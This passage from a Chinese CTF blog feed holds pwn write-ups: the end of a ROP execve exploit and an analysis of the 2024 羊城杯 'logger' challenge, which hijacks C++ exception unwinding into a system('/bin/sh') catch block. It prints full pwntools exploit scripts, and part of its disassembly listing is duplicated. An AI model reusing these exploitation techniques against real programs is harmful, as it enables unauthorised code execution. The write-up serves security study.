class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&quot;./control&quot;</span>)</span><br><span class="line">r = process(<span class="string">&quot;./control&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gift = <span class="number">0x4D3350</span></span><br><span class="line">vuln = <span class="number">0x402183</span></span><br><span class="line"></span><br><span class="line">payload = p64(gift) + p64(vuln)</span><br><span class="line">r.sendafter(<span class="string">b&quot;Gift&gt; &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+p64(gift)</span><br><span class="line">r.sendafter(<span class="string">b&quot;control?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x462c27</span></span><br><span class="line">pop_rdi = <span class="number">0x401c72</span></span><br><span class="line">pop_rsi = <span class="number">0x405285</span></span><br><span class="line">pop_rdx_rbx = <span class="number">0x495b8b</span></span><br><span class="line">syscall = <span class="number">0x40161e</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">14</span></span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span>  <span class="comment"># &lt;-- gift</span></span><br><span class="line">payload += p64(pop_rax)  <span class="comment"># &lt;-- ret地址</span></span><br><span class="line">payload += p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(gift)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_rbx)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="2024羊城杯-logger"><a href="#2024羊城杯-logger" class="headerlink" title="2024羊城杯 logger"></a>2024羊城杯 logger</h3><h5 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h5><p>这道题就要用到最开始分析的方法了，因为这道题是有后门的。</p><p>trace函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_4015AB</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  __int16 v4; <span class="comment">// [rsp+26h] [rbp-Ah] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nYou can record log details here: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span> &amp;&amp; byte_404020[<span class="number">16</span> * i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_404020[<span class="number">16</span> * i + read(<span class="number">0</span>, &amp;byte_404020[<span class="number">16</span> * i], <span class="number">0x10</span>uLL)] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Do you need to check the records? &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%1s&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)v4 == <span class="number">121</span> || (_BYTE)v4 == <span class="number">89</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="number">8</span>;</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">8</span> &amp;&amp; byte_404020[<span class="number">16</span> * j] &amp;&amp; v3; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1B[31mRecord%d. %.16s\x1B[0m&quot;</span>, j + <span class="number">1</span>, &amp;byte_404020[<span class="number">16</span> * j]);</span><br><span class="line">        --v3;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( (_BYTE)v4 != <span class="number">110</span> &amp;&amp; (_BYTE)v4 != <span class="number">78</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid input. Please enter &#x27;y&#x27; or &#x27;n&#x27;.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Records have been filled :(&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数允许我们写九次每次16个字节的数据，每次写入后会在末尾加一个截断符，写入的时候会检查该地址起始是否为\0。</p><p>warn函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_40178A</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *exception; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  _BYTE buf[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  _QWORD v5[<span class="number">4</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  _QWORD v6[<span class="number">5</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+68h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_401CA0(buf);</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">  sub_4014FD(v5, <span class="number">32LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\x1B[1;31m%s\x1B[0m\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[!] Type your message here plz: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v0 = read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  HIBYTE(v3) = HIBYTE(v0);</span><br><span class="line">  buf[v0 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt; <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(byte_404200, buf, <span class="keyword">sizeof</span>(byte_404200));</span><br><span class="line">    <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;dest[<span class="built_in">strlen</span>(dest)], <span class="string">&quot;: &quot;</span>);</span><br><span class="line">    <span class="built_in">strncat</span>(dest, byte_404200, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(dest);</span><br><span class="line">    exception = __cxa_allocate_exception(<span class="number">8uLL</span>);</span><br><span class="line">    *exception = src;</span><br><span class="line">    __cxa_throw(exception, (<span class="keyword">struct</span> type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span><span class="type">char</span> *, <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(byte_404100, buf, <span class="keyword">sizeof</span>(byte_404100));</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">  sub_4014FD(v6, <span class="number">32LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[User input log]\nMessage: %s\nDone at %s\n&quot;</span>, byte_404100, (<span class="type">const</span> <span class="type">char</span> *)v6);</span><br><span class="line">  sub_401CCA(buf);</span><br><span class="line">  <span class="keyword">return</span> v7 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有抛出异常的函数，如果输入字节的长度大于16字节就会抛出异常。查看汇编发现当前函数是没有catch块的，而调用链上最近的catch块在main函数（其实也是调用链上唯一一个）。异常抛出函数将src处（在data段）的字符当作exception传给catch，然后打印一串字符，接着继续执行main函数，因为main是无限循环的，所以不会退出。</p><p>同时可以发现这个程序其实不止一个catch块，并且在0x401BC7的catch执行了system，所以我们可以劫持ret地址到这个后门catch块。接下来考虑怎么传参就行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401B</span>8F ; <span class="type">void</span> __noreturn <span class="title function_">sub_401B8F</span><span class="params">()</span></span><br><span class="line">.text:0000000000401B8F sub_401B8F      proc near</span><br><span class="line">.text:0000000000401B8F</span><br><span class="line">.text:0000000000401B8F command         = qword ptr <span class="number">-18</span>h</span><br><span class="line">.text:<span class="number">0000000000401B</span>8F var_8           = qword ptr <span class="number">-8</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>8F</span><br><span class="line">.text:<span class="number">0000000000401B</span>8F ; __unwind &#123; <span class="comment">// __gxx_personality_v0</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>8F                 endbr64</span><br><span class="line">.text:<span class="number">0000000000401B</span>93                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000401B</span>94                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000401B</span>97                 push    rbx</span><br><span class="line">.text:<span class="number">0000000000401B</span>98                 sub     rsp, <span class="number">18</span>h</span><br><span class="line">.text:<span class="number">0000000000401B</span>9C                 mov     edi, <span class="number">8</span>          ; thrown_size</span><br><span class="line">.text:<span class="number">0000000000401B</span>A1                 call    ___cxa_allocate_exception</span><br><span class="line">.text:<span class="number">0000000000401B</span>A6                 lea     rdx, aEchoHelloYcbCt ; <span class="string">&quot;echo Hello, YCB ctfer!&quot;</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>AD                 mov     [rax], rdx</span><br><span class="line">.text:<span class="number">0000000000401B</span>B0                 mov     edx, <span class="number">0</span>          ; <span class="type">void</span> (*)(<span class="type">void</span> *)</span><br><span class="line">.text:<span class="number">0000000000401B</span>B5                 mov     rcx, cs:_ZTIPKc_ptr</span><br><span class="line">.text:<span class="number">0000000000401B</span>BC                 mov     rsi, rcx        ; lptinfo</span><br><span class="line">.text:<span class="number">0000000000401B</span>BF                 mov     rdi, rax        ; <span class="type">void</span> *</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2 ;   try &#123;</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2                 call    ___cxa_throw</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2 ;   &#125; <span class="comment">// starts at 401BC2</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>C7 ; ---------------------------------------------------------------------------.text:<span class="number">0000000000401B</span>8F ; <span class="type">void</span> __noreturn <span class="title function_">sub_401B8F</span><span class="params">()</span></span><br><span class="line">.text:0000000000401B8F sub_401B8F      proc near</span><br><span class="line">.text:0000000000401B8F</span><br><span class="line">.text:0000000000401B8F command         = qword ptr <span class="number">-18</span>h</span><br><span class="line">.text:<span class="number">0000000000401B</span>8F var_8           = qword ptr <span class="number">-8</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>8F</span><br><span class="line">.text:<span class="number">0000000000401B</span>8F ; __unwind &#123; <span class="comment">// __gxx_personality_v0</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>8F                 endbr64</span><br><span class="line">.text:<span class="number">0000000000401B</span>93                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000401B</span>94                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000401B</span>97                 push    rbx</span><br><span class="line">.text:<span class="number">0000000000401B</span>98                 sub     rsp, <span class="number">18</span>h</span><br><span class="line">.text:<span class="number">0000000000401B</span>9C                 mov     edi, <span class="number">8</span>          ; thrown_size</span><br><span class="line">.text:<span class="number">0000000000401B</span>A1                 call    ___cxa_allocate_exception</span><br><span class="line">.text:<span class="number">0000000000401B</span>A6                 lea     rdx, aEchoHelloYcbCt ; <span class="string">&quot;echo Hello, YCB ctfer!&quot;</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>AD                 mov     [rax], rdx</span><br><span class="line">.text:<span class="number">0000000000401B</span>B0                 mov     edx, <span class="number">0</span>          ; <span class="type">void</span> (*)(<span class="type">void</span> *)</span><br><span class="line">.text:<span class="number">0000000000401B</span>B5                 mov     rcx, cs:_ZTIPKc_ptr</span><br><span class="line">.text:<span class="number">0000000000401B</span>BC                 mov     rsi, rcx        ; lptinfo</span><br><span class="line">.text:<span class="number">0000000000401B</span>BF                 mov     rdi, rax        ; <span class="type">void</span> *</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2 ;   try &#123;</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2                 call    ___cxa_throw</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2 ;   &#125; <span class="comment">// starts at 401BC2</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>C7 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000401B</span>C7 ;   catch(<span class="type">char</span> <span class="type">const</span>*) <span class="comment">// owned by 401BC2</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>C7                 endbr64</span><br><span class="line">.text:<span class="number">0000000000401B</span>CB                 cmp     rdx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>CF                 jz      <span class="type">short</span> loc_401BD9</span><br><span class="line">.text:<span class="number">0000000000401B</span>D1                 mov     rdi, rax        ; <span class="class"><span class="keyword">struct</span> _<span class="title">Unwind_Exception</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">0000000000401B</span>D4                 call    __Unwind_Resume</span><br><span class="line">.text:<span class="number">0000000000401B</span>D9 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000401B</span>D9</span><br><span class="line">.text:<span class="number">0000000000401B</span>D9 loc_401BD9:                             ; CODE XREF: sub_401B8F+<span class="number">40</span>↑j</span><br><span class="line">.text:<span class="number">0000000000401B</span>D9                 mov     rdi, rax        ; <span class="type">void</span> *</span><br><span class="line">.text:<span class="number">0000000000401B</span>DC                 call    ___cxa_begin_catch</span><br><span class="line">.text:<span class="number">0000000000401B</span>E1                 mov     [rbp+command], rax</span><br><span class="line">.text:<span class="number">0000000000401B</span>E5                 mov     rax, [rbp+command]</span><br><span class="line">.text:<span class="number">0000000000401B</span>E9                 mov     rsi, rax</span><br><span class="line">.text:<span class="number">0000000000401B</span>EC                 lea     rax, aAnExceptionOfT_1 ; <span class="string">&quot;[-] An exception of type String was cau&quot;</span>...</span><br><span class="line">.text:<span class="number">0000000000401B</span>F3                 mov     rdi, rax        ; format</span><br><span class="line">.text:<span class="number">0000000000401B</span>F6                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>FB ;   try &#123;</span><br><span class="line">.text:<span class="number">0000000000401B</span>FB                 call    _printf</span><br><span class="line">.text:<span class="number">0000000000401</span>C00                 mov     rax, [rbp+command]</span><br><span class="line">.text:<span class="number">0000000000401</span>C04                 mov     rdi, rax        ; command</span><br><span class="line">.text:<span class="number">0000000000401</span>C07                 call    _system</span><br><span class="line">.text:<span class="number">0000000000401</span>C07 ;   &#125; <span class="comment">// starts at 401BFB</span></span><br><span class="line">.text:<span class="number">0000000000401</span>C0C                 nop</span><br><span class="line">.text:<span class="number">0000000000401</span>C0D                 call    ___cxa_end_catch</span><br><span class="line">.text:<span class="number">0000000000401</span>C12                 jmp     <span class="type">short</span> loc_401C2B</span><br><span class="line">.text:<span class="number">0000000000401</span>C14 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000401</span>C14 ;   cleanup() <span class="comment">// owned by 401BFB</span></span><br><span class="line">.text:<span class="number">0000000000401</span>C14                 endbr64</span><br><span class="line">.text:<span class="number">0000000000401</span>C18                 mov     rbx, rax</span><br><span class="line">.text:<span class="number">0000000000401</span>C1B                 call    ___cxa_end_catch</span><br><span class="line">.text:<span class="number">0000000000401</span>C20                 mov     rax, rbx</span><br><span class="line">.text:<span class="number">0000000000401</span>C23                 mov     rdi, rax        ; <span class="class"><span class="keyword">struct</span> _<span class="title">Unwind_Exception</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">0000000000401</span>C26                 call    __Unwind_Resume</span><br><span class="line">.text:<span class="number">0000000000401</span>C2B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000401</span>C2B</span><br><span class="line">.text:<span class="number">0000000000401</span>C2B loc_401C2B:                             ; CODE XREF: sub_401B8F+<span class="number">83</span>↑j</span><br><span class="line">.text:<span class="number">0000000000401</span>C2B                 mov     rbx, [rbp+var_8]</span><br><span class="line">.text:<span class="number">0000000000401</span>C2F                 leave</span><br><span class="line">.text:<span class="number">0000000000401</span>C30                 retn</span><br><span class="line">.text:<span class="number">0000000000401</span>C30 ; &#125; <span class="comment">// starts at 401B8F</span></span><br><span class="line">.text:<span class="number">0000000000401</span>C30 sub_401B8F      endp</span><br></pre></td></tr></table></figure><p>可以看到参数是rbp-0x18处的数据，但是在0x401BE1处程序将rax赋给了rbp-0x18，所以要动调看看赋了什么。动调发现是0x4040a0，所以我们需要在这个地方写入binsh。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/32gx 0x404020</span></span><br><span class="line">0x404020:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x404030:       0x3b68732f6e69622f      0x00000000004040a0</span><br><span class="line">0x404040:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x404050:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x404060:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x404070:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x404080:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x404090:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x4040a0:       0x0068732f6e69622f      0x00776f6c6672000a</span><br><span class="line">0x4040b0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x4040c0:       0x00007fa631b00848      0x00007fa631b006f8</span><br><span class="line">0x4040d0:       0x00007fa6319908c0      0x0000000000000000</span><br></pre></td></tr></table></figure><p>原本0x4040a0是<code>Buffer Overflow</code>这个字符串，但是利用trace在末尾加截断符的性质可以将这个字符串覆写为binsh。</p><p>至于rbp劫持了为多少，只要rbp-0x18不要超出data段就行了。</p><p>对了，这里一样也是不用顾虑canary的问题，因为抛出异常之后，<code>__stack_chk_fail</code>不会被执行到。</p><h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trace</span>(<span class="params">content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;chocie:&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;details here:&quot;</span>, content)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;records?&quot;</span>, <span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">warn</span>(<span class="params">content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;chocie:&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;plz: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    trace(<span class="string">b&#x27;/bin/sh;&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">trace(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">binsh = <span class="number">0x404020</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b *0x401BE1&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">warn(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*(<span class="number">0x70</span>//<span class="number">8</span>)+p64(<span class="number">0x404050</span>)+p64(<span class="number">0x401bc7</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">从2024羊城杯logger题目引起的cpp异常处理机制学习</summary>
    
    
    
    <category term="cpp异常处理机制" scheme="https://c-lby.top/categories/cpp%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6/"/>
    
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="cpp异常处理机制" scheme="https://c-lby.top/tags/cpp%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-25</title>
    <link href="https://c-lby.top/2024/08/25/diary/24-8-25/"/>
    <id>https://c-lby.top/2024/08/25/diary/24-8-25/</id>
    <published>2024-08-25T04:54:02.000Z</published>
    <updated>2024-08-25T05:39:48.445Z</updated>
    
    <content type="html"><![CDATA[<p>结营，证书+2，知识+n</p><p>准备一下蓝队的知识吧</p><p>算了学<a href="https://mp.weixin.qq.com/s/lipd1tc9RGW3VW_WEpjQxA">protobuf</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;结营，证书+2，知识+n&lt;/p&gt;
&lt;p&gt;准备一下蓝队的知识吧&lt;/p&gt;
&lt;p&gt;算了学&lt;a href=&quot;https://mp.weixin.qq.com/s/lipd1tc9RGW3VW_WEpjQxA&quot;&gt;protobuf&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-24</title>
    <link href="https://c-lby.top/2024/08/24/diary/24-8-24/"/>
    <id>https://c-lby.top/2024/08/24/diary/24-8-24/</id>
    <published>2024-08-24T04:53:57.000Z</published>
    <updated>2024-08-25T04:56:15.507Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://mlm.lingyiwanwu.com/">机器语言大模型MLM</a></p><p>来自高傲的清华</p>]]></content>
    
    
      
      
